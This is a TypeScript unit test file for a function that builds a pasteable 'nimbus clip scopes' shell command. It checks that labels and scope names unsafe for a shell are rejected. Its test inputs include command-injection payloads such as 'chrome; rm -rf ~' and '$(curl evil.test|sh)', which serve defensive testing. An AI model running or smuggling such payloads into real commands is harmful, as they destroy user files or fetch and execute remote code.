import { describe, expect, it } from "vitest";
import { scopeCommand } from "../../src/shared/scope-command.ts";

describe("scopeCommand", () => {
  it("names the real label and the full resulting set", () => {
    expect(
      scopeCommand({ label: "chrome", required: "fetch", granted: ["clip", "briefs", "resolve"] }),
    ).toBe("nimbus clip scopes chrome --set clip,briefs,resolve,fetch");
  });

  it("preserves scopes the client knows nothing about — --set REPLACES the set", () => {
    // A hardcoded "clip,briefs,fetch" would silently strip `agents`.
    expect(scopeCommand({ label: "work", required: "fetch", granted: ["clip", "agents"] })).toBe(
      "nimbus clip scopes work --set clip,agents,fetch",
    );
  });

  it("does not duplicate a scope that is somehow already granted", () => {
    expect(scopeCommand({ label: "x", required: "resolve", granted: ["clip", "resolve"] })).toBe(
      "nimbus clip scopes x --set clip,resolve",
    );
  });

  it("handles an empty granted set", () => {
    expect(scopeCommand({ label: "x", required: "fetch", granted: [] })).toBe(
      "nimbus clip scopes x --set fetch",
    );
  });

  // SECURITY. The label is gateway-supplied (it comes back from pair/confirm) and
  // the gateway does NOT constrain its characters — pairing-window.ts takes
  // `label: string` unvalidated. We render a command the user is invited to paste
  // into a shell, so anything that is not a plain identifier gets NO command at
  // all. Quoting is not a fix: in POSIX shells `$(...)` and backticks execute
  // inside double quotes, and correct escaping across bash/pwsh/cmd is not
  // achievable from here.
  it("returns null for a label that is not a plain identifier", () => {
    for (const label of [
      "my laptop",
      "chrome; rm -rf ~",
      "$(curl evil.test|sh)",
      "`id`",
      "a\nb",
      "",
      "x".repeat(65),
    ]) {
      expect(scopeCommand({ label, required: "fetch", granted: ["clip"] })).toBeNull();
    }
  });

  it("accepts the identifier characters a label legitimately uses", () => {
    for (const label of ["chrome", "work-laptop", "asaf.dev", "box_2"]) {
      expect(scopeCommand({ label, required: "fetch", granted: ["clip"] })).toBe(
        `nimbus clip scopes ${label} --set clip,fetch`,
      );
    }
  });

  // SECURITY. `required` and `granted` are ALSO gateway-supplied — straight off
  // the 403 body — and the upstream guards (parseScopeGap, isScopeGap) only check
  // typeof === "string", not the characters. A safe label alone is not enough:
  // the same injection can arrive through a sibling field and land in `--set`.
  it("returns null for an unsafe scope name in required or granted", () => {
    expect(
      scopeCommand({ label: "chrome", required: "fetch", granted: ["clip; rm -rf ~"] }),
    ).toBeNull();
    expect(scopeCommand({ label: "chrome", required: "$(id)", granted: ["clip"] })).toBeNull();
  });
});
